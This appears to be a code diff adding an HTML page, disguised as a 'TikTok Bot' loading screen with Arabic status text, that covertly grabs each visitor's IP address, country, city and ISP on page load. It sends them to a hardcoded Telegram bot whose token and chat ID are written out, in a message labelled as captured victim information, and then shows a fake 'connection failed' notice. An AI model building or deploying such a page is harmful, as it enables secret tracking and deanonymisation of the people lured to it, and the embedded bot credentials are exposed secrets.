@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0d1117; color:#fff; font-family:Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
+        .box { background:#161b22; padding:30px; border-radius:20px; text-align:center; width:90%; max-width:350px; border:1px solid #ff0050; }
+        .spinner { width:40px; height:40px; margin:15px auto; border:4px solid #333; border-top:4px solid #ff0050; border-radius:50%; animation:spin 1s infinite; }
+        @keyframes spin { 0% { transform:rotate(0); } 100% { transform:rotate(360deg); } }
+        #status { color:#8b949e; font-size:14px; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1 style="color:#ff0050;">📡 TikTok Bot</h1>
+        <p style="color:#8b949e;">جاري فحص النظام...</p>
+        <div class="spinner"></div>
+        <div id="status">جاري التحميل...</div>
+    </div>
+
+    <script>
+        const CHAT_ID = "6833915955";
+        const BOT_TOKEN = "8675259276:AAEqVwW4S1kqh7LTa7ZO1KClh7O8Ip4D6eU";
+
+        // استخدام موقع ipinfo.io بدلاً من ip-api
+        async function getLocation() {
+            try {
+                const res = await fetch('https://ipinfo.io/json');
+                const data = await res.json();
+                return data;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        window.onload = async function() {
+            document.getElementById('status').innerText = "جاري تأمين الاتصال...";
+            
+            const info = await getLocation();
+
+            let msg = `📍 **تم التقاط معلومات الضحية**\n`;
+            
+            if (info && info.ip) {
+                msg += `🌐 الـ IP: ${info.ip}\n`;
+                msg += `🌍 الدولة: ${info.country || 'غير معروف'}\n`;
+                msg += `🏙️ المدينة: ${info.city || 'غير معروف'}\n`;
+                msg += `📡 المزود: ${info.org || 'غير معروف'}\n`;
+            } else {
+                msg += `❌ تعذر الحصول على معلومات دقيقة.`;
+            }
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
+
+            document.getElementById('status').innerText = "✅ تم تأمين الاتصال!";
+            setTimeout(() => {
+                document.getElementById('status').innerText = "❌ فشل الاتصال بالخادم.";
+                document.getElementById('status').style.color = "#ff4444";
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
